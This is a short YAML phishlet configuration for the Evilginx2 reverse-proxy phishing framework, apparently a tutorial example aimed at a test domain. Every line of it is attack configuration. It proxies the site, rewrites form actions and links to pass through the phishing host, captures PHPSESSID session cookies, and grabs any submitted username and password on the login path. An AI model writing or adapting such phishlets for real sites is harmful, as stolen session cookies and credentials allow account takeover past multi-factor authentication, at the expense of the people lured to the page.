name: 'custom' 
author: '@cyberpunk_rs' 
min_ver: '2.1.0' 
proxy_hosts: 
 - {phish_sub: 'www', orig_sub: 'www', domain: 'evilginx2-test.tk', session: true, is_landing: true} 
sub_filters: 
 - {hostname: 'www.evilginx2-test.tk', sub: 'www', domain: 'evilginx2-test.tk', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']} 
 - {hostname: 'www.evilginx2-test.tk', sub: 'www', domain: 'evilginx2-test.tk', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']} 
 - {hostname: 'www.evilginx2-test.tk', sub: 'www', domain: 'evilginx2-test.tk', search: '//{hostname}/ex/', replace: '//{hostname}/ex/', mimes: ['text/html', 'application/json']} 
auth_urls: 
 - '/ex/' 
auth_tokens: 
 - domain: 'www.evilginx2-test.tk' 
   keys: ['PHPSESSID'] 
user_regex: 
 key: 'username' 
 re: '(.*)' 
pass_regex: 
 key: 'password' 
 re: '(.*)' 
landing_path: 
 - '/login/'
